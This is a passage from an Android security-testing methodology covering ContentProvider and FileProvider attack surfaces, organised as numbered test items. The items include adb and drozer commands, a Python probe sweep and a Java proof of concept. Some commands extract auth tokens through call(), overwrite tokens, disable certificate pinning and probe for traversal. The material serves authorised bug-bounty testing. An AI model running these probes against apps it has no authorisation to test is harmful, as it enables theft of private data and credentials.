# D07 · ContentProviders & FileProvider

> ContentProviders are the only sanctioned hole in the app sandbox, and the only IPC surface an attacker
> drives with a shell one-liner and no code. This is one of the two or three Android domains whose ceiling
> is genuinely P1 — arbitrary read of the victim's private storage, SQL injection into the victim's
> database, and arbitrary write into a code-load path all live here — and it is the domain where a lazy
> tester most reliably files a P5 instead.

| | |
|---|---|
| **Phases** | P3 attack-surface inventory, P4 static deep review, P5 IPC & component attack |
| **Milestones** | M3, M4, M5 |
| **VRT ceiling** | **P1** — `server_side_injection.file_inclusion.local` for the arbitrary-read primitive and `server_side_injection.sql_injection` for the injection. Both are defined server-side, so the honest filing is to name the closest accurate node (`broken_access_control.exposed_sensitive_android_intent`, VARIES, CWE-927) *and* state the P1 analogue with the reachability proof, then request the severity in the first body section. Never file a provider bug under `insecure_data_storage.*` — that branch is P5/P4 and it throws the finding away. |
| **Primary attacker model** | **AM-03** zero-permission local app. AM-04 where a grant must be obtained; AM-02 where a deep link drives the app's own ContentResolver; AM-05 for cross-account rows. |
| **Maps to** | MASVS-PLATFORM, MASVS-STORAGE, MASVS-CODE · MASTG-TEST-0355, MASTG-TEST-0356, MASTG-TEST-0357, MASTG-TEST-0339, MASTG-TEST-0025, MASTG-TEST-0250 · MASTG-TECH-0148, MASTG-TECH-0159, MASTG-TECH-0163 · MASWE-0018, MASWE-0050, MASWE-0002, MASWE-0036 · CWE-89, CWE-20, CWE-73, CWE-200, CWE-306, CWE-926, CWE-927, CWE-939, CWE-940 · T1409, T1533, T1636, T1641 |

## Why this domain pays

Providers pay because the platform's whole confidentiality story for app data is `/data/data/<pkg>` being
mode `0700` from `targetSdkVersion >= 24`. A traversal in `openFile()` or an injectable `selection` does
not weaken that boundary — it walks through the one door the platform deliberately left in it. That is why
the same bug that would be "information disclosure" on a web target is an app-sandbox escape here, and why
`server_side_injection.file_inclusion.local` (P1) is a defensible analogue rather than a stretch. Oversecured
state that more than 90% of the apps they analyse contain provider implementation errors of varying
criticality; that is a base rate for *defects*, not for payable findings, and the gap between the two is the
whole craft of this chapter.

The domain is not mostly graveyard, but its graveyard is unusually seductive. "Exported ContentProvider"
fired by MobSF on an app targeting SDK 34 with an explicit `signature`-level `readPermission` is noise. The
`targetSdk < 17` default-export rule is noise on anything shipped this decade. `<root-path>` in a paths XML
with no exported provider and no grant primitive is a configuration observation, not a finding. Nextcloud
rate same-device provider bugs Low (#291764 Low 0.9 / $150; #242727 Low / $75; #518669 Low 0.9 / $100)
because their published threat model discounts a malicious app on the same device entirely — so check the
programme's carve-out *before* you spend a day here, because the identical bug is Medium 4.2 at ownCloud
(#1650264, GHSL-2022-059) and High 7.8 at Mattermost (#1115864) once it reaches code execution.

The exception that makes the domain worth the day is direction. Almost every public checklist tests the
provider *outbound* — query it, traverse it, inject it. The highest-paying provider bugs of the last three
years ran *inbound*: the victim app queried the attacker's provider for `OpenableColumns.DISPLAY_NAME` and
used the returned string as a filename (Microsoft's Dirty Stream: Xiaomi File Manager
`com.mi.android.globalFileexplorer` 1B+ installs, vulnerable V1-210567; WPS Office `cn.wps.moffice_eng`
500M+ installs, vulnerable 16.8.1), or it resolved a `content://` URI an attacker handed it and read its own
private file under its own UID. Google's Mobile VRP is explicit that arbitrary file write only pays its top
tier when you demonstrate the code execution — the write alone underpays. Plan for the write-then-load
chain from the start, not as an afterthought.

## The crux question

**Does any caller outside this app's UID reach a provider method that either resolves a caller-controlled
string into a filesystem path or concatenates a caller-controlled string into SQL — and if the answer is no,
can the app itself be made to call that method on the attacker's behalf?**

## Triage order

1. **Enumerate authorities from the merged manifest and the runtime provider table, then hit each one with
   `content query` / `read` / `call`.** Five minutes, needs no code, and it partitions the whole domain into
   reachable and unreachable before you read a line of decompiled source.
2. **Test `call()` on every authority, including ones whose `query` was denied.** The framework applies no
   permission check specific to `call()`, and it is addressed by method name rather than URI, so every
   `<path-permission>` and `UriMatcher` guard in the app misses it. Highest reward-per-minute in the domain.
3. **Decide file-backed vs SQLite-backed per authority before you fuzz.** An exported authority that resolves
   but returns nothing to `query` is an `openFile` provider; sending it SQLi payloads wastes an hour.
4. **Traversal, with `/proc/version` as the canary, before anything sensitive.** Unambiguous positive,
   harmless payload, clean PoC. Escalate to `shared_prefs`/`databases` only after the canary lands.
5. **`selection`, then `projection`, then `sortOrder`, then the write verbs' `selection`.** In that order:
   the error message from the first one hands you the table name, the column count and the provider's own
   paren wrapper, which makes the other three cheap.
6. **`grantUriPermissions` on every provider, exported or not.** This is the item that decides whether a
   `exported="false"` provider is a true negative or a D08 chain waiting for a redirector.
7. **The paths XML.** One `cat`, and it sets the blast radius of every grant bug you find later.
8. **Reverse the inbound direction: `OpenableColumns.DISPLAY_NAME`, `EXTRA_STREAM`, `onActivityResult`.**
   Slowest to set up (you must ship a hostile provider) and the highest ceiling. Start it early enough that
   the build is ready when you need it.
9. **Proxying sinks — `getContentResolver()` calls *inside* provider methods, and `Uri.parse(getQueryParameter(...))`.**
   Rare, and Critical when present.
10. **Everything else.** Slices, cloud media, persistable-grant retention, authority collisions.

## Items

### D07-001 · Enumerate every declared authority with all six access-control attributes

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0163, MASTG-TEST-0355, rule `mastg-android-content-provider-exported.yml` |

- **Test:** Extract every `<provider>` with `authorities`, `exported`, `permission`, `readPermission`,
  `writePermission` and `grantUriPermissions` together. Reading `exported` alone produces a wrong inventory,
  because `readPermission`/`writePermission` override `permission` per-direction and `grantUriPermissions`
  re-opens a provider that is not exported.
- **How:**
```bash
apktool d -f target.apk -o out/
xmlstarlet sel -t -m "//provider" \
  -v "@android:name" -o " | auth=" -v "@android:authorities" \
  -o " | exported=" -v "@android:exported" \
  -o " | perm=" -v "@android:permission" \
  -o " | read=" -v "@android:readPermission" \
  -o " | write=" -v "@android:writePermission" \
  -o " | grantUri=" -v "@android:grantUriPermissions" -n out/AndroidManifest.xml
# binary-manifest fallback, no apktool
aapt2 d xmltree target.apk --file AndroidManifest.xml | grep -A8 "E: provider"
```
- **Proof:** A table with one row per authority and a filled value (or an explicit `-`) in all six columns.
  Any row with `exported=true` and every permission column empty is an immediate step-2 candidate.
- **Escalation:** Feeds D07-005 (three-verb probe) and D07-021 (grants). Authorities belonging to bundled
  SDKs go to D07-003 and -> D18 SDK configuration.
- **Ruled out when:** Every `<provider>` carries `exported="false"` **and** `grantUriPermissions` is absent
  or `"false"` **and** no `<grant-uri-permission>` child exists — at which point the authority is only
  reachable through the app's own code (D07-053), which you must then still check.

### D07-002 · The targetSdk<17 default-export gate — state it or lose the report

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (rating qualifier) |
| **Attacker** | AM-03 |
| **Applies to** | `targetSdkVersion < 17` only — **LEGACY** |
| **Maps to** | MASTG-TEST-0355; MobSF `exported_provider` family (`ANDROID_4_2_LEVEL = 17`) |

- **Test:** A `<provider>` with no `android:exported` attribute defaults to `true` when the app targets
  API < 17, and to `false` at 17 and above. Scanners fire this rule on modern apps and produce noise. On a
  modern app the inverse matters: an exported provider is a *deliberate* decision, which strengthens the
  report — say so.
- **How:**
```bash
aapt dump badging target.apk | grep -E 'sdkVersion|targetSdkVersion'
# confirm the platform's own view rather than the manifest's
adb shell dumpsys package com.target.app | sed -n '/Provider Resolver Table/,/Service Resolver Table/p'
```
- **Proof:** Either `targetSdkVersion:'16'` or lower in badging output *plus* `dumpsys` showing
  `exported=true` on a provider with no manifest attribute (the LEGACY case), or a modern target with an
  explicit `android:exported="true"` (the strong case). Quote whichever applies in the finding's preconditions.
- **Escalation:** n/a — this is the sentence that stops a triager downgrading the finding as "default
  behaviour of an obsolete platform".
- **Ruled out when:** `targetSdkVersion >= 17` and no provider declares `android:exported="true"`. The
  default-export class does not exist on this build; record the target SDK as the evidence.

### D07-003 · Cross-check the merged manifest against the runtime provider table

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler) |
| **Attacker** | AM-03 |
| **Applies to** | all; especially apps with bundled SDKs |
| **Maps to** | MASTG-TECH-0163 |

- **Test:** The authorities the app's own developers wrote are a subset of the authorities the app ships.
  Manifest merging pulls in `FileProvider`s from image pickers, crash reporters, chat and payment SDKs,
  plus `androidx.startup.InitializationProvider`, `androidx.work`, Firebase and Play Services initialisers.
  Nobody on the client's team has reviewed those paths XMLs.
- **How:**
```bash
adb shell dumpsys package com.target.app | sed -n '/Provider Resolver Table/,/Service Resolver Table/p' \
  | tee /tmp/runtime_authorities.txt
grep -oE 'android:authorities="[^"]+"' out/AndroidManifest.xml | sed 's/.*="//; s/"//' | tr ';' '\n' | sort -u
# any provider class NOT under the app's own package prefix is SDK-contributed
grep -oE 'android:name="[^"]+Provider"' out/AndroidManifest.xml | sed 's/.*="//; s/"//' \
  | grep -v '^com\.target\.app'
```
- **Proof:** A list of authorities whose implementing class lives outside the app's package namespace,
  each with its own `@xml/*paths*` meta-data resource. Name the SDK in the report — it changes who fixes it.
- **Escalation:** -> D18 third-party SDK configuration; the SDK's paths XML goes straight to D07-054.
- **Ruled out when:** Every runtime authority maps to a class under the app's own package prefix and the
  `dumpsys` list and the manifest list are identical.

### D07-004 · Recover the URI path space the manifest never names

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0163; drozer `app.provider.finduri`, `scanner.provider.finduris` (MASTG-TOOL-0015) |

- **Test:** The manifest gives you an authority; it never gives you the paths. Those live in
  `UriMatcher.addURI()` calls, `Uri.parse("content://...")` constants, `CONTENT_URI` fields and string
  resources. A provider you cannot address returns nothing and reads as a false negative.
- **How:**
```bash
grep -rnE 'addURI\(|UriMatcher|content://|CONTENT_URI|buildUpon\(\)' out/sources/ | sort -u | head -80
# string-derived candidates, then the ones that actually answer
drozer> run app.provider.finduri com.target.app
drozer> run scanner.provider.finduris -a com.target.app
```
  The `addURI(authority, path, code)` triple also tells you the matcher's wildcards: `#` constrains a
  segment to digits, `*` accepts any string — note which branch each injectable read sits on before you
  claim exploitability.
- **Proof:** The set difference between string-derived candidates and URIs that answer from an unprivileged
  UID. That difference is the work queue for the rest of this chapter.
- **Escalation:** Every reachable URI goes through `columns` -> `query` -> `read` -> `insert/update/delete`
  -> `call`.
- **Ruled out when:** No `addURI` or `content://` string exists for the authority and the provider's
  `query()` returns `null` unconditionally — i.e. it is a stub, or a pure `call()`/`openFile()` provider
  (in which case go to D07-014 and D07-028, do not record a negative here).

### D07-005 · Read, write and `call()` are three separate questions

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) where it yields file bytes; `broken_access_control.exposed_sensitive_android_intent` (VARIES) for the access itself |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0148, MASTG-TEST-0356, MASWE-0018 |

- **Test:** A denial on `query` says nothing about `insert`, `update`, `delete`, `openFile` or `call`.
  `android:readPermission` without `android:writePermission` is a routine manifest asymmetry, and `call()`
  is gated by neither. Run all six verbs against every authority, always.
- **How:**
```bash
A=content://com.target.app.provider
adb shell content query  --uri $A/items
adb shell content query  --uri $A/items --projection "*" --where "1=1" --sort "_id"
adb shell content insert --uri $A/items --bind name:s:probe7x2k9qd --bind _id:i:99999
adb shell content update --uri $A/items --bind name:s:probe7x2k9qd --where "_id=1"
adb shell content delete --uri $A/items --where "_id=99999"
adb shell content call   --uri $A --method probe --arg x --extra k:s:v
adb shell content read   --uri $A/items/1
adb shell content gettype --uri $A/items
# --bind types: s=string i=int l=long f=float d=double b=boolean
```
- **Proof:** Six labelled command outputs. The finding is the pair: a `SecurityException` on one verb and a
  success on another, side by side.
- **Escalation:** A readable row -> D07-065 (rate by content) -> D15. A successful write -> D07-039 blind
  oracle, or a security-relevant column flip -> D23.
- **Ruled out when:** All six verbs return `java.lang.SecurityException: Permission Denial: ... requires
  <permission> or ... not exported from uid` from an app UID (not just from `shell`), and
  `grantUriPermissions` is false — capture all six exception strings verbatim for the ruled-out register.

### D07-006 · Classify the exception by layer before recording a positive or a negative

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (false-positive gate) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | the layer-ordering trap (an error from a layer in front of the auth check does not prove you passed the auth check) |

- **Test:** This is the provider form of the layer-ordering trap. Testers read "no `SecurityException`" as
  "readable" and "any exception" as "closed". Both are wrong. The permission check runs in
  ActivityManager when the provider is *acquired*, before any provider code executes — so an exception
  thrown from **inside** the provider proves you passed the gate, while several different failures look
  identical from the shell. Re-probe with a minimal well-formed URI before you conclude anything.
- **How:** Map the observed string to its layer:

| Observed | Layer | Means |
|---|---|---|
| `SecurityException: Permission Denial: opening provider ... requires <perm>` | AMS, provider-level | Gate held. True negative for this verb. |
| `SecurityException: Permission Denial: ... not exported from uid` | AMS, export check | Gate held. |
| `Failed to find provider info for <auth>` / `Unknown authority` | package resolution | You never reached the app at all — often package visibility (targetSdk 30+), not permission. Re-test with `<queries>` declared. |
| `IllegalArgumentException: Unknown URI/URL content://...` | inside `query()`/`UriMatcher` | **You passed the permission gate.** Wrong path, right authority. Go back to D07-004. |
| `SQLiteException: unrecognized token` / `no such column` | inside the SQL layer | You passed the gate *and* your string reached SQL. Go to D07-035. |
| `FileNotFoundException: No files supported by provider at ...` | inside `openFile()` | You passed the gate; it is a cursor provider, not a file provider. |
| `NullPointerException` from provider frames | inside the provider | Passed the gate; also a D19 crash candidate. |

```bash
# minimal well-formed probe, for the authority root with no path
adb shell content query --uri content://com.target.app.provider 2>&1 | head -3
# then the same from a stub app with <queries> declared, to separate visibility from permission
```
- **Proof:** The exact exception text plus the layer it belongs to, recorded per authority per verb.
- **Escalation:** An `Unknown URI` is a *positive* reachability result and should reopen an authority you
  had written off.
- **Ruled out when:** Every verb produces an AMS-layer `Permission Denial` from an app UID with `<queries>`
  declared. That is a defensible true negative; anything else is an unfinished test.

### D07-007 · Re-prove every provider hit from an app UID, not the `shell` UID

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (false-positive gate) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0148 (the `content` command "executes in the context of the shell user") |

- **Test:** `adb shell content` runs as uid 2000, which holds platform permissions no third-party app has.
  A finding proved only from `adb` has not established AM-03, and a triager who reproduces it from an app
  and gets a denial will close it. Conversely, `shell` is *unaffected* by scoped storage and package
  visibility, which is exactly why it is the right discovery tool — just not the right proof tool.
- **How:**
```bash
# discovery (shell UID)
adb shell content query --uri content://com.target.app.provider/items
# proof (app UID) — minimal stub, no permissions in its manifest at all
```
```java
// AndroidManifest.xml of the PoC: <queries><package android:name="com.target.app"/></queries>
Uri u = Uri.parse("content://com.target.app.provider/items");
Cursor c = getContentResolver().query(u, null, null, null, null);
Log.i("poc", DatabaseUtils.dumpCursorToString(c));
```
  drozer runs as an installed app and is an acceptable stand-in where a custom PoC is not warranted.
- **Proof:** Both outputs in the report. Identical rows from both -> genuinely AM-03. Rows from `shell` only
  -> downgrade or drop, and say which you used.
- **Escalation:** n/a — this is the gate that keeps the finding alive at triage.
- **Ruled out when:** The app-UID reproduction throws `SecurityException` while `shell` succeeds. Record it
  as a shell-only artefact, not a finding.

### D07-008 · Sweep authorities with a counted loop, never a bare shell array

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (methodology control) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | the Shell-Loop Ban — zsh array expansion fails silently and the output still looks complete |

- **Test:** A provider sweep is the classic case: dozens of authorities crossed with a dozen path variants
  crossed with six verbs. A shell loop over an array that the previous command failed to populate produces
  zero iterations, no error, and a clean-looking transcript. Count your probes.
- **How:** Loops of five or fewer hardcoded items in shell are fine. Anything iterating a list, a file or a
  computed range goes to Python with per-iteration logging and an explicit final count.
```python
#!/usr/bin/env python3
import subprocess, itertools, sys
AUTHS = [a.strip() for a in open('/tmp/authorities.txt') if a.strip()]
VARIANTS = ["", "/", "//", "/1", "/x", "/.", "/%2e%2e%2f"]
expected = len(AUTHS) * len(VARIANTS); done = 0
for auth, v in itertools.product(AUTHS, VARIANTS):
    uri = f"content://{auth}{v}"
    try:
        r = subprocess.run(["adb","shell","content","query","--uri",uri],
                           capture_output=True, text=True, timeout=20)
        out = (r.stdout + r.stderr).strip().splitlines()[:1]
        verdict = ("CLOSED" if "SecurityException" in "".join(out)
                   else "ERR" if "Exception" in "".join(out) else "**READABLE**")
        print(f"{uri:<70} {verdict} {out}")
    except Exception as e:
        print(f"{uri:<70} TIMEOUT/ERR {e}", file=sys.stderr)
    done += 1
print(f"\n[count] expected={expected} executed={done}", file=sys.stderr)
assert done == expected, "loop ate probes"
```
- **Proof:** `expected == executed` printed at the end of every sweep, quoted in the working notes.
- **Escalation:** n/a.
- **Ruled out when:** n/a — this is unconditional. A sweep without a probe count is not evidence of absence.

### D07-009 · Prove the negative with the exact exception text

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (deliverable) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | the ruled-out register (`templates/ruled-out-table.md`) |

- **Test:** "The scanner found nothing" is not a negative. A ruled-out entry must carry the evidence that
  killed the hypothesis, per authority and per verb, from an app UID.
- **How:**
```bash
for A in $(cat /tmp/authorities.txt); do
  echo "=== $A"
  adb shell content query --uri "content://$A" 2>&1 | head -2
  adb shell content call  --uri "content://$A" --method probe 2>&1 | head -2
done | tee /tmp/provider_negatives.txt
```
- **Proof:** A table of `authority | verb | exception string | date`, e.g.
  `com.target.app.sync | query | java.lang.SecurityException: Permission Denial: opening provider
  com.target.app.SyncProvider from ProcessRecord{...} (pid=..., uid=10234) requires
  com.target.app.permission.SYNC`. This pre-empts "did you check the providers?" at delivery.
- **Escalation:** Re-open every negative the moment you find a grant primitive (D07-021/-022) or a URI sink
  inside the app (D07-053). A provider negative is conditional on those two being absent.
- **Ruled out when:** n/a — this *is* the ruled-out procedure.

### D07-010 · Read the provider from a second Android user and from a locked Private Space

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 on a secondary user / work profile |
| **Applies to** | Android 5+ multi-user; Private Space Android 15+ |
| **Maps to** | Google's Android & Google Devices scope: "Multi-User & Private Space: Cross-user sensitive data access" |

- **Test:** Everyone queries as user 0. Cross-user data access is an explicitly purchased impact class, and
  an app that keys its provider on a package name rather than a `UserHandle` can serve user 0's rows to a
  caller in the work profile or a secondary user.
- **How:**
```bash
adb shell pm list users
adb shell am get-current-user
adb shell content query --user 0  --uri content://com.target.app.provider/items
adb shell content query --user 10 --uri content://com.target.app.provider/items
# the file form of the same question
adb shell content read --uri 'content://com.target.app.fileprovider/files/x' --user 10
# Private Space: lock it, then retry — apps inside should be stopped
```
- **Proof:** Rows returned with `--user 10` that belong to user 0, or the converse. A `Permission Denial`
  naming the user id is itself a useful data point for the ruled-out register.
- **Escalation:** -> D15 if the rows carry server object ids you can then enumerate across accounts.
- **Ruled out when:** The provider is not installed for the secondary user (`pm list packages --user 10`
  does not list it), or `--user 10` returns only that user's own rows with a distinct dataset.

### D07-011 · `readPermission` / `writePermission` asymmetry

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0355; `guide/topics/manifest/provider-element` |

- **Test:** The two directions are independent and are enforced independently. Declaring only
  `readPermission` leaves `insert`/`update`/`delete` open to everyone; declaring only `writePermission`
  leaves `query` open. Do not reason about it — test both.
- **How:**
```bash
grep -nE 'android:(read|write)Permission|android:permission=' out/AndroidManifest.xml
drozer> run app.provider.info -a com.target.app -v     # "Required Permission - Read: null" is the tell
adb shell content query  --uri content://com.target.app.provider/settings
adb shell content update --uri content://com.target.app.provider/settings \
  --bind value:s:0 --where "name='pinning_enabled'"
```
- **Proof:** `Required Permission - Read: null` alongside a non-null write permission (or the inverse), plus
  the verb that succeeds. Note the framework's own warning applies: a write permission alone is not
  containment, because `WHERE` clauses in `update`/`delete` confirm data by side effect (D07-039).
- **Escalation:** A write that flips a security setting (pinning off, device trusted, role elevated) is an
  integrity finding on its own -> D23; a write into a rendered field -> D10 stored XSS in a WebView.
- **Ruled out when:** A single `android:permission` covers both directions with no differing
  `readPermission`/`writePermission`, and the protectionLevel check in D07-013 passes.

### D07-012 · `android:permission` silently overridden by a weaker per-direction permission

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `guide/topics/manifest/provider-element` (readPermission/writePermission take precedence over permission) |

- **Test:** `android:readPermission` and `android:writePermission` *override* `android:permission` for their
  direction. A provider that looks protected because it carries a signature-level `android:permission` is
  wide open in whichever direction a weaker attribute is also present. Reviewers see the first attribute and
  stop reading.
- **How:**
```bash
python3 - <<'PY'
import xml.dom.minidom as m
d = m.parse('out/AndroidManifest.xml')
for p in d.getElementsByTagName('provider'):
    g = lambda k: p.getAttribute('android:'+k) or '-'
    perm, rd, wr = g('permission'), g('readPermission'), g('writePermission')
    flag = 'OVERRIDE' if perm != '-' and (rd not in ('-', perm) or wr not in ('-', perm)) else ''
    print(f"{g('authorities'):<45} perm={perm:<40} read={rd:<40} write={wr:<40} {flag}")
PY
```
- **Proof:** A row flagged `OVERRIDE`, followed by the verb in the overridden direction succeeding from an
  app UID that does not hold the strong permission.
- **Escalation:** Combine with D07-019 to find the path variant on which the weak direction is reachable.
- **Ruled out when:** No provider declares both `permission` and a differing per-direction attribute, or
  the per-direction attribute is at least as strong (verify with D07-013, not by name).

### D07-013 · Resolve the protectionLevel of the custom permission that "protects" the provider

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0355; D03 permission model |

- **Test:** A provider guarded by `com.target.app.permission.READ_DATA` is only as strong as that
  permission's `protectionLevel`. `normal` is auto-granted at install to any app that requests it, so the
  provider is effectively unprotected. `dangerous` needs a user prompt but is grantable. Only `signature`
  (or `signatureOrSystem`) actually excludes an attacker. The manifest reviewer reads the `<provider>` line
  and the permission reviewer reads the `<permission>` line; nobody joins them.
- **How:**
```bash
grep -nE '<permission |protectionLevel' out/AndroidManifest.xml
adb shell dumpsys package com.target.app | sed -n '/declared permissions:/,/^$/p'
# then actually take it, from a stub app that declares <uses-permission> for it:
adb shell pm list permissions -d -g | grep -A2 com.target.app
adb shell dumpsys package com.poc.stub | grep -A20 'requested permissions'
```
- **Proof:** `protectionLevel=normal` (or `0` in dumpsys) on the guarding permission, followed by the stub
  app holding it after a plain install and reading the provider.
- **Escalation:** -> D03 for the full permission-matrix work; the provider read then rates on its contents
  (D07-065).
- **Ruled out when:** `dumpsys package` shows `protectionLevel: signature` on every permission named by the
  provider's `permission`/`readPermission`/`writePermission`/`<path-permission>` attributes, **and** the app
  is not part of a shared-signature family whose other members an attacker could reach (D18).

### D07-014 · `call()` is gated by neither the read nor the write permission

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where it returns or sets auth state; `broken_access_control.exposed_sensitive_android_intent` (VARIES) otherwise |
| **Attacker** | AM-03 |
| **Applies to** | all providers overriding `call()` |
| **Maps to** | QARK `INSECURE_FUNCTIONS_NAMES = ("call",)` — "The framework does no permission checking on this entry into the content provider besides the basic ability for the application to get access to the provider at all"; drozer `app.provider.call` |

- **Test:** Beyond the provider-acquisition check, the platform applies no permission logic to `call()`.
  Every `call()` implementation must verify its own caller and almost none do. `call()` is where developers
  put the things they never modelled as CRUD: `getAuthToken`, `exportDatabase`, `setFlag`, `wipe`,
  `debugDump`. A provider declared `readPermission`-only still exposes `call()` to anyone who satisfies the
  read permission — so test `call()` even on providers you believe are read-only.
- **How:**
```bash
adb shell content call --uri content://com.target.app.provider --method getAuthToken --arg current
adb shell content call --uri content://com.target.app.provider --method exportDatabase
adb shell content call --uri content://com.target.app.provider --method setAuthToken --arg attacker
drozer> run app.provider.call content://com.target.app.provider \
        --method getAuthToken --argument current \
        --bundle "S.account=victim@example.com;B.refresh=false"
# drozer bundle prefixes: S.=String B.=Boolean b.=Byte c.=Char
```
- **Proof:** `Result: Bundle[{token=eyJ...}]` printed by `content call`, or `Done.` from drozer plus the
  observable side effect. A returned Bundle from an app UID holding no permissions is the whole finding.
- **Escalation:** A token-returning method -> D13/D15 account takeover. A setter -> D23 entitlement grant.
  A dump method -> D07-062 side effects.
- **Ruled out when:** The provider does not override `call()` (`grep -rn 'public Bundle call(' out/sources/`
  returns nothing for that class and its superclasses), or every branch of the `call()` switch starts with
  an enforced `getCallingPackage()`/`checkCallingPermission()` gate whose failure path throws.

### D07-015 · `call()` bypasses `UriMatcher` and `<path-permission>` by design

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | all providers that authorise by path |
| **Maps to** | `guide/topics/providers/content-provider-creating`; `guide/topics/manifest/provider-element` (`<path-permission>` is path-scoped) |

- **Test:** `ContentProvider.call(authority, method, arg, extras)` is addressed by *authority and method
  name*, not by a URI path. Every `<path-permission>` entry and every `UriMatcher`-based authorisation
  branch written inside `query()`/`insert()`/`update()`/`delete()` is therefore inapplicable to `call()`.
  A provider whose real logic lives in `call()` while its manifest protects paths is a complete
  authorisation bypass.
- **How:**
```bash
# 1. confirm the app authorises by path
xmllint --format out/AndroidManifest.xml | sed -n '/<provider/,/<\/provider>/p' | grep -n 'path-permission'
# 2. confirm the logic lives in call()
grep -rnA40 'public Bundle call(' out/sources/
# 3. invoke a method whose equivalent URI path is permission-protected
adb shell content call --uri content://com.target.app.provider --method readKeys
```
- **Proof:** `content query --uri content://.../keys` returning `Permission Denial` and
  `content call --method readKeys` returning the same data in a Bundle. The pair is the finding.
- **Escalation:** This is usually the richest single primitive in a provider — chain to D13 (token) or D11
  (whatever the protected path held).
- **Ruled out when:** `call()` is not overridden, or it delegates to the same `UriMatcher`-driven
  authorisation used by the CRUD methods and you have shown the denial path executing.

### D07-016 · Enumerate the `call()` method table out of the DEX

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler for D07-014) |
| **Attacker** | AM-03 |
| **Applies to** | all providers overriding `call()` |
| **Maps to** | drozer `app.provider.call`; MASTG-TECH-0148 |

- **Test:** `call()` method names are never in the manifest and rarely in a string resource you would
  notice. They live in the switch inside `call()`. Without them, D07-014 degrades to guessing.
- **How:**
```bash
# the switch arms, scoped to the call() body
grep -rn -A60 'public Bundle call(' out/sources/ \
  | grep -oE '(case |equals\(|hashCode\(\) == )[^;]*"[A-Za-z_][A-Za-z0-9_]{2,48}"' \
  | grep -oE '"[A-Za-z_][A-Za-z0-9_]{2,48}"' | sort -u
# R8 often compiles the switch to a hashCode()+equals() ladder — read the ladder, not just `case`
jadx-gui out/target.apk   # navigate to the provider class, read call() top to bottom
```
  Then drive each name with a probe bundle and record which ones do not throw.
- **Proof:** The extracted method-name list plus the per-method result (`Bundle[{...}]`, `Bundle[{}]`,
  exception). A method returning a non-empty Bundle to an unprivileged caller goes to D07-014.
- **Escalation:** -> D07-014, D07-062.
- **Ruled out when:** The `call()` body is a single `return super.call(...)` or `return null`.

### D07-017 · `<path-permission>` form coverage — the five path attributes

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | providers declaring `<path-permission>` |
| **Maps to** | `guide/topics/manifest/provider-element` (`path`, `pathPrefix`, `pathPattern`, `pathSuffix`, `pathAdvancedPattern`) |

- **Test:** `<path-permission>` protects only the paths its attribute matches. `android:path` is an exact
  string match; `pathPrefix` matches a prefix; `pathPattern` is a restricted glob where `*` means "zero or
  more of the preceding character" (not "any string") and `.` is a literal-plus-`*` idiom; `pathSuffix` and
  `pathAdvancedPattern` are newer and rarely used correctly. Anything the element does **not** match falls
  back to the provider-level permission — and if none is declared, to nothing.
- **How:**
```bash
xmllint --format out/AndroidManifest.xml | sed -n '/<provider/,/<\/provider>/p'
# for each <path-permission>, construct a URI the pattern does NOT match but the provider still serves
adb shell content query --uri content://com.target.app.provider/protected        # expect denial
adb shell content query --uri content://com.target.app.provider/protected/sub    # prefix vs exact
adb shell content query --uri content://com.target.app.provider/protectedX       # pathPattern greed
adb shell content query --uri content://com.target.app.provider/Protected        # case
```
  Remember `UriMatcher` `#` is digits-only and `*` is any segment — a `path-permission` written for
  `/items/#` does not cover `/items/abc` if the matcher routes both.
- **Proof:** The protected form denied and an unmatched-but-served form returning rows, printed side by side.
- **Escalation:** Full provider read; then D07-019 for the normalisation variants of the same idea.
- **Ruled out when:** A provider-level `permission` (or per-direction pair) covers everything the
  `<path-permission>` elements do not, so an unmatched path still hits a check — demonstrate the denial on
  a deliberately unmatched path.

### D07-018 · `/Keys` versus `/Keys/` — the trailing-slash path-permission bypass

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | all providers doing path-based authorisation |
